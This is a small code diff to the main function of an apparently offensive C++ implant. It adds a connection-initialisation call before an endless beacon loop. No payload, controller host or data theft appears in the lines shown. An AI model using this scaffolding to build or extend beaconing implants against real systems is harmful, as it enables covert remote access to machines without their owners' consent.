@@ -6,6 +6,8 @@
 #include <iostream>
 
 int main() {
+    implant::initConnection();
+
     while (true) { // Run indefinitely
         // Call the beacon function
         std::string result = implant::beacon();
